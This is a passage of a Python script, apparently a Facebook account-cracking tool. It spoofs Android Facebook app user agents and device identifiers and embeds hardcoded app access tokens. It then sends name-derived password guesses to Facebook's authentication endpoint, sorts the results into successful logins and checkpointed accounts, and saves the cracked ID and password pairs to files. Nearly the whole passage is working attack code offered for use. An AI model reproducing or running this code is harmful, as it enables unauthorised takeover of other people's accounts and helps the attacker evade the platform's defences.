[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android 9.0.1; Nokia Build/QP1A.792171.342) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A950G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A950G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G900Y Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G900Y;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1150F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.lite;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A1100S Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A1100S;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A850FU Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A850FU;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'])
                        ua = random.choice(['[Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Pro Build/RQ3A.210705.001) [FBAN/Messenger;FBAV/97.0.4692.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/521.0.0.28.220;FBCR/310260;FBMF/motorola;FBBD/SM-N960U;FBDV/Pixel 6 Pro;FBSV/12;FBCA/SM7125;FBDM/7;]','[Dalvik/2.1.0 (Linux; U; Android 10; Galaxy S21 Build/N4F26I) [FBAN/Messenger;FBAV/97.0.4692.99;FBPN/com.facebook.orca;FBLC/fr_FR;FBBV/503.0.0.22.120;FBCR/310120;FBMF/lg;FBBD/K13a40;FBDV/Galaxy S21;FBSV/10;FBCA/SM6125;FBDM/1;]','[Dalvik/2.1.0 (Linux; U; Android 7.1.1; Pixel 6 Pro Build/N2G48B) [FBAN/Messenger;FBAV/97.0.4692.99;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/336.0.0.20.117;FBCR/310900;FBMF/lg;FBBD/SM-N960U;FBDV/Pixel 6 Pro;FBSV/7.1.1;FBCA/SM6115;FBDM/3;]','[Dalvik/2.1.0 (Linux; U; Android 11; Pixel 6 Pro Build/RQ3A.210705.001) [FBAN/Messenger;FBAV/99.0.4844.51;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/356.0.0.9.116;FBCR/310260;FBMF/realme;FBBD/K13a40;FBDV/Pixel 6 Pro;FBSV/11;FBCA/SM6115;FBDM/10;]','[Dalvik/2.1.0 (Linux; U; Android 11; Pixel 2 Build/PPR1.180610.011) [FBAN/Messenger;FBAV/97.0.4692.99;FBPN/com.facebook.orca;FBLC/zh_CN;FBBV/402.0.0.0.7;FBCR/310120;FBMF/lg;FBBD/LM-Q730;FBDV/Pixel 2;FBSV/11;FBCA/SM4350;FBDM/10;]'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#4method
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;34m [NOYON-M3] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        gttt = random.choice(['G900F','G950F','G1000F','G1050F','G1100F','G1150F','G1200F','G1250F','G1300F','G1350F','G1400F','G1450F','G1500F','G1550F','G1600F','G1650F','G1700F','G1750F','G1800F','A115F','A120F','A150F','A200F','A115G','A900G','A950G','A950F','A1000F','A1050F','A1100F','A1150F','A1200F','A250F','A300F','A350F','A400F','A450F','G115F','G200F','G250F','G300F','G532G','G533G'])
                        usee = random.choice(['[FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};]','[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/377.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/'+fbsv+'.0.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-'+gttt+';FBSV/'+fbsv+'.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','[FBAN/FB4A;FBAV/315.0.0.47.113;FBPN/com.facebook.katana;FBLC/en_US;FBBV/285966838;FBCR/Android;FBMF/Genymotion;FBBD/Android;FBDV/Xiaomi Redmi Note 7;FBSV/9;FBCA/x86:null;FBDM/{density=2.625,width=1080,height=2214};FB_FW/1;FBRV/287051585;]','[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        #ua = '[FBAN/FB4A;FBAV/'+android_version+';FBBV/SM-'+gttt+';[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/277740997;FBCR/Idea;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi_4;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621679;FBDM/{density=1.75,width=720,height=1423};FBLC/en_GB;FBRV/302569938;FBCR/Jio_4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660425;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/306637004;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2127;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400804;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2219;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279747;FBDM/{density=2.75,width=1080,height=2177};FBLC/en_US;FBRV/0;FBCR/IND_airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K6P;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233374;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/296244047;FBCR/Vodafone_IN;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1925;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                        ua = random.choice(['Mozilla/5.0 (Android; Android 5.0.2; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/600.50 (KHTML, like Gecko)  Chrome/53.0.1279.326 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 4.4; SM-G900W8 Build/KOT49H) AppleWebKit/603.21 (KHTML, like Gecko)  Chrome/48.0.2228.158 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.4.4; LG-D955 Build/KOT49I) AppleWebKit/600.6 (KHTML, like Gecko)  Chrome/48.0.3550.119 Mobile Safari/601.1','Mozilla/5.0 (Android; Android 6.0.1; HTC One M9 Build/MRA58K) AppleWebKit/600.8 (KHTML, like Gecko)  Chrome/55.0.2531.367 Mobile Safari/603.1','Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MDB08L) AppleWebKit/603.43 (KHTML, like Gecko)  Chrome/54.0.2339.227 Mobile Safari/533.1','Mozilla/5.0 (Android; Android 5.1; MOTO XT1570 MOTO X STYLE Build/LPD23) AppleWebKit/602.33 (KHTML, like Gecko)  Chrome/50.0.3836.393 Mobile Safari/534.7','Mozilla/5.0 (Linux; Android 6.0.1; HTC One_M8 dual sim Build/MRA58K) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/51.0.2981.260 Mobile Safari/602.5','Mozilla/5.0 (Linux; Android 4.3.1; SM-G340A Build/JLS36C) AppleWebKit/600.50 (KHTML, like Gecko)  Chrome/54.0.3588.294 Mobile Safari/603.2','Mozilla/5.0 (Linux; Android 7.1; Pixel XL Build/NME91E) AppleWebKit/537.35 (KHTML, like Gecko)  Chrome/51.0.2321.177 Mobile Safari/535.6','Mozilla/5.0 (Android; Android 5.0.1; Lenovo A7000-a Build/LRX21M;) AppleWebKit/537.1 (KHTML, like Gecko)  Chrome/52.0.3432.398 Mobile Safari/603.3','Mozilla/5.0 (Linux; Android 7.1; Pixel XL Build/NME91E) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/50.0.2227.370 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 7.0; SAMSUNG GT-I9500 Build/KTU84P) AppleWebKit/603.48 (KHTML, like Gecko)  Chrome/54.0.1339.191 Mobile Safari/537.9','Mozilla/5.0 (Linux; Android 5.1; SAMSUNG SM-G935M Build/MMB29M) AppleWebKit/536.49 (KHTML, like Gecko)  Chrome/50.0.1026.311 Mobile Safari/533.3','Mozilla/5.0 (Linux; Android 7.0; Xperia Build/NDE63X) AppleWebKit/601.36 (KHTML, like Gecko)  Chrome/53.0.3237.150 Mobile Safari/536.4','Mozilla/5.0 (Linux; Android 4.3.1; HTC One 801s Build/JSS15J) AppleWebKit/533.43 (KHTML, like Gecko)  Chrome/55.0.1473.380 Mobile Safari/603.5','Mozilla/5.0 (Android; Android 5.0; LG-D953P Build/LRX22G) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/48.0.2556.180 Mobile Safari/603.4','Mozilla/5.0 (Linux; Android 7.1.1; LG-H900 Build/NRD90M) AppleWebKit/537.38 (KHTML, like Gecko)  Chrome/55.0.3210.129 Mobile Safari/533.8','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-G330A Build/JLS36C) AppleWebKit/535.47 (KHTML, like Gecko)  Chrome/49.0.1281.332 Mobile Safari/537.0','Mozilla/5.0 (Android; Android 5.1; MOTO X PURE XT1575 Build/LXB22) AppleWebKit/603.1 (KHTML, like Gecko)  Chrome/52.0.1115.118 Mobile Safari/600.7','Mozilla/5.0 (Android; Android 5.0.1; LG-G834I Build/LMY47X) AppleWebKit/600.45 (KHTML, like Gecko)  Chrome/54.0.1253.287 Mobile Safari/534.7','Mozilla/5.0 (Android; Android 5.0; LG-D728 Build/LRX22G) AppleWebKit/601.45 (KHTML, like Gecko)  Chrome/53.0.3684.397 Mobile Safari/535.9','Mozilla/5.0 (Linux; Android 4.3.1; HTC One max Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko)  Chrome/48.0.2010.388 Mobile Safari/533.6','Mozilla/5.0 (Android; Android 4.4.4; Nexus S 4G Build/GRJ22) AppleWebKit/533.41 (KHTML, like Gecko)  Chrome/53.0.2812.331 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 5.0; HTC 80:number1-2w Build/JSS15J) AppleWebKit/603.28 (KHTML, like Gecko)  Chrome/52.0.2713.274 Mobile Safari/536.4','Mozilla/5.0 (Linux; Android 4.4; SM-G900T Build/KOT49H) AppleWebKit/537.4 (KHTML, like Gecko)  Chrome/51.0.1593.389 Mobile Safari/533.7','Mozilla/5.0 (Android; Android 5.0; LG-D728 Build/LRX22G) AppleWebKit/537.23 (KHTML, like Gecko)  Chrome/53.0.3824.137 Mobile Safari/603.1','Mozilla/5.0 (Linux; U; Android 7.0; LG-H930 Build/NRD90M) AppleWebKit/537.18 (KHTML, like Gecko)  Chrome/49.0.1868.290 Mobile Safari/601.7','Mozilla/5.0 (Linux; Android 4.3.1; HTC Xplorer A320s Build/GRJ90) AppleWebKit/603.47 (KHTML, like Gecko)  Chrome/48.0.2905.247 Mobile Safari/536.1','Mozilla/5.0 (Linux; Android 4.4; E:number:20-23:33 Build/24.0.A.1.34) AppleWebKit/534.50 (KHTML, like Gecko)  Chrome/49.0.3106.204 Mobile Safari/536.1','Mozilla/5.0 (Linux; Android 4.4; SAMSUNG SM-N8010 Build/JZO54K) AppleWebKit/601.1 (KHTML, like Gecko)  Chrome/53.0.3102.229 Mobile Safari/602.3','Mozilla/5.0 (Android; Android 4.4; LG-D953 Build/KOT49I) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/51.0.2934.164 Mobile Safari/534.3','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-G450 Build/LRX22G) AppleWebKit/535.18 (KHTML, like Gecko)  Chrome/54.0.2804.393 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 4.4; SM-J200F Build/KTU84P) AppleWebKit/536.9 (KHTML, like Gecko)  Chrome/47.0.3303.227 Mobile Safari/603.5','Mozilla/5.0 (Linux; U; Android 7.0; Xperia V Build/NDE63X) AppleWebKit/600.5 (KHTML, like Gecko)  Chrome/53.0.2818.363 Mobile Safari/537.4','Mozilla/5.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MMB29K) AppleWebKit/600.12 (KHTML, like Gecko)  Chrome/51.0.2288.378 Mobile Safari/601.5','Mozilla/5.0 (Linux; Android 7.0; Pixel XL Build/NME91E) AppleWebKit/602.17 (KHTML, like Gecko)  Chrome/51.0.3697.295 Mobile Safari/600.7','Mozilla/5.0 (Android; Android 4.4.4; SM-J110F Build/KTU84P) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/53.0.2219.159 Mobile Safari/600.0','Mozilla/5.0 (Linux; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/535.41 (KHTML, like Gecko)  Chrome/50.0.2409.209 Mobile Safari/535.9','Mozilla/5.0 (Android; Android 7.1; Nexus 5X Build/NPD90G) AppleWebKit/535.2 (KHTML, like Gecko)  Chrome/53.0.2442.258 Mobile Safari/602.1','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/602.3 (KHTML, like Gecko)  Chrome/55.0.3837.323 Mobile Safari/603.6','Mozilla/5.0 (Android; Android 5.1; Nexus 9 Build/LRX22C) AppleWebKit/534.19 (KHTML, like Gecko)  Chrome/50.0.2025.216 Mobile Safari/536.2','Mozilla/5.0 (Linux; U; Android 7.0; GT-I9600 Build/KTU84P) AppleWebKit/536.19 (KHTML, like Gecko)  Chrome/48.0.3939.312 Mobile Safari/534.7','Mozilla/5.0 (Android; Android 4.4.4; MOTOROLA MSM8960 Build/KVT49L) AppleWebKit/603.26 (KHTML, like Gecko)  Chrome/48.0.1200.119 Mobile Safari/534.8','Mozilla/5.0 (Linux; Android 5.1.1; SM-G935T Build/MMB29M) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/47.0.2755.171 Mobile Safari/536.2','Mozilla/5.0 (Linux; U; Android 5.1.1; Nexus 5 Build/LMY48B) AppleWebKit/533.10 (KHTML, like Gecko)  Chrome/50.0.3673.158 Mobile Safari/536.7','Mozilla/5.0 (Linux; Android 6.0; HTC One_M9 Build/MRA58K) AppleWebKit/600.45 (KHTML, like Gecko)  Chrome/48.0.1383.265 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 4.4.4; LG-F500K Build/KOT49I) AppleWebKit/603.2 (KHTML, like Gecko)  Chrome/54.0.1457.152 Mobile Safari/534.7','Mozilla/5.0 (Linux; Android 5.0; HTC Butterfly S 919d Build/LRX22G) AppleWebKit/537.26 (KHTML, like Gecko)  Chrome/52.0.3553.400 Mobile Safari/600.1','Mozilla/5.0 (Linux; Android 5.1.1; MOTO G XT1068 Build/LPD23) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/47.0.3055.223 Mobile Safari/601.6','Mozilla/5.0 (Android; Android 5.1.1; SM-G935M Build/LMY47X) AppleWebKit/600.38 (KHTML, like Gecko)  Chrome/52.0.1781.337 Mobile Safari/535.9','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-G470 Build/LRX22C) AppleWebKit/601.40 (KHTML, like Gecko)  Chrome/55.0.2322.390 Mobile Safari/533.5','Mozilla/5.0 (Linux; U; Android 4.4.1; Elephone P5000 Build/KTU84P) AppleWebKit/603.41 (KHTML, like Gecko)  Chrome/50.0.1843.275 Mobile Safari/537.8','Mozilla/5.0 (Android; Android 4.3.1; HUAWEI G6-L10 Build/HuaweiG6-L11) AppleWebKit/603.30 (KHTML, like Gecko)  Chrome/52.0.1388.240 Mobile Safari/535.4','Mozilla/5.0 (Linux; U; Android 7.1.1; GT-I9700 Build/KTU84P) AppleWebKit/533.13 (KHTML, like Gecko)  Chrome/48.0.1119.166 Mobile Safari/537.0','Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48B) AppleWebKit/600.50 (KHTML, like Gecko)  Chrome/55.0.3383.277 Mobile Safari/535.3','Mozilla/5.0 (Linux; Android 5.1.1; SM-G925M Build/LMY47X) AppleWebKit/537.30 (KHTML, like Gecko)  Chrome/55.0.1419.387 Mobile Safari/603.2','Mozilla/5.0 (Android; Android 5.1; Nexus 6 Build/LRX22C) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/51.0.2174.378 Mobile Safari/600.2','Mozilla/5.0 (Android; Android 5.0.2; LG-D701 Build/LRX22G) AppleWebKit/602.49 (KHTML, like Gecko)  Chrome/51.0.2866.378 Mobile Safari/601.6','Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G410 Build/LRX22C) AppleWebKit/601.21 (KHTML, like Gecko)  Chrome/51.0.1774.303 Mobile Safari/600.3','Mozilla/5.0 (Android; Android 4.3.1; GT-I9200 Build/JDQ39) AppleWebKit/536.1 (KHTML, like Gecko)  Chrome/53.0.2941.308 Mobile Safari/602.0','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-G3589V Build/JLS36C) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/48.0.3860.358 Mobile Safari/534.0','Mozilla/5.0 (Linux; U; Android 4.4; HTC OneS dual sim Build/KTU84L) AppleWebKit/534.37 (KHTML, like Gecko)  Chrome/47.0.1363.160 Mobile Safari/536.5','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/533.8 (KHTML, like Gecko)  Chrome/55.0.2547.227 Mobile Safari/533.6','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T245v Build/JSS15J) AppleWebKit/535.1 (KHTML, like Gecko)  Chrome/54.0.2960.307 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 5.1.1; Nexus 8 Build/LRX22C) AppleWebKit/537.47 (KHTML, like Gecko)  Chrome/54.0.2220.369 Mobile Safari/534.4','Mozilla/5.0 (Android; Android 4.4.1; Nexus5 V6.1 Build/KOT49H) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/54.0.3383.166 Mobile Safari/533.9','Mozilla/5.0 (Linux; U; Android 4.4.1; Nexus S 4G Build/GRJ22) AppleWebKit/537.11 (KHTML, like Gecko)  Chrome/48.0.2467.391 Mobile Safari/602.6','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T285s Build/JSS15J) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/53.0.1959.166 Mobile Safari/537.4','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/603.34 (KHTML, like Gecko)  Chrome/53.0.1396.109 Mobile Safari/600.1','Mozilla/5.0 (Linux; U; Android 4.4; SM-G9009D Build/KOT49H) AppleWebKit/536.17 (KHTML, like Gecko)  Chrome/49.0.1370.351 Mobile Safari/533.4','Mozilla/5.0 (Android; Android 5.0.2; Lenovo A7000-a Build/LRX21M;) AppleWebKit/537.39 (KHTML, like Gecko)  Chrome/54.0.3127.314 Mobile Safari/536.0','Mozilla/5.0 (Linux; Android 4.4; IQ4500 Quad Build/KOT49H) AppleWebKit/535.47 (KHTML, like Gecko)  Chrome/52.0.3683.391 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/536.20 (KHTML, like Gecko)  Chrome/55.0.3563.114 Mobile Safari/603.5','Mozilla/5.0 (Linux; Android 4.3.1; GT-I9300 Build/JDQ39) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/48.0.3987.116 Mobile Safari/601.9','Mozilla/5.0 (Android; Android 5.1.1; SM-G935FG Build/MMB29M) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/55.0.1573.333 Mobile 